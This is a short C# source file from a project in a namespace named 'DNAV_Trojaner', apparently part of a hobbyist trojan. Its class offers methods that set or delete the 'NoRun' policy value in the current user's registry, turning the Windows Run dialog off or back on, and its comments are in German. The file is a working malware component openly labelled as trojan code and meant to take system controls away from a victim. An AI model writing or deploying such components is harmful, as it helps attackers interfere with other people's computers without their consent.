using Microsoft.Win32;

namespace DNAV_Trojaner
{
    class Run
    {
        /// <summary>
        /// Aktiviert den Ausführen Dialog
        /// </summary>
        public static void Enable()
        {
            RegistryKey run = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            if (run.GetValue("NoRun") != null)
            {
                run.DeleteValue("NoRun");
            }
        }

        /// <summary>
        /// Deaktiviert den Ausführen Dialog
        /// </summary>
        public static void Disbable()
        {
            RegistryKey run = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            run.SetValue("NoRun", 0x00000001, RegistryValueKind.DWord);
            run.Close();/**/
        }
    }
}
